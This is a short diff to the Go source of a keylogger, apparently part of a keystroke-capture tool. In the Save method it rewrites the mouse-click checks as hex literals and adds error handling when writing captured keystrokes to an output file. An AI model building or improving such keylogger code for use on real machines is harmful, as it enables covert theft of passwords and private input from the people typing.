@@ -91,7 +91,7 @@ func (l *KeyLogger) Save(keyStroke uintptr) {
 	var output strings.Builder
 
 	// Ignore mouse clicks
-	if keyStroke == 1 || keyStroke == 2 {
+	if keyStroke == 0x01 || keyStroke == 0x02 {
 		return
 	}
 
@@ -165,8 +165,15 @@ func (l *KeyLogger) Save(keyStroke uintptr) {
 	}
 
 	// Instead of opening and closing file handlers every time, keep file open and flush.
-	l.OutputFile.WriteString(output.String())
-	l.OutputFile.Sync()
+	_, err := l.OutputFile.WriteString(output.String())
+	if err != nil {
+		fmt.Println("Error writing to output file:", err)
+		return
+	}
+	err = l.OutputFile.Sync()
+	if err != nil {
+		fmt.Println("Error flushing output file:", err)
+	}
 
 	fmt.Print(output.String())
 }
